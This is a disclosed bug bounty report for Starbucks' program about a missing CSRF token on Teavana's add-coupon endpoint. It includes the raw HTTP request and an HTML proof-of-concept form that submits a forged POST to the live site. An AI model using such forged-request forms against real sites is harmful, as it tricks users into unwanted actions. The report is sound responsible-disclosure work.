# Missing CSRF Token On Add Coupon To Basket

## Report Details
- **Report ID**: 227725
- **URL**: https://hackerone.com/reports/227725
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-05-11T15:58:00.382Z
- **Disclosed**: 2019-01-22T23:22:45.649Z

## Reporter
- **Username**: apapedulimu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi,
When Adding Coupun It's missing CSRF Token, and at this time, i use `BOGO50` Coupun to reproduce it.

__Vuln Request__
```
POST /on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50&format=ajax HTTP/1.1
Host: www.teavana.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Cookie: <some cookie>
Connection: close
Upgrade-Insecure-Requests: 1

```

__PoC Code__
```
<html>
<body>
<form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50&format=ajax" method="POST">
<input type="hidden" name="" value="" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```

Thanks, 
If you need video, i will create one !

## Attachments
No attachments
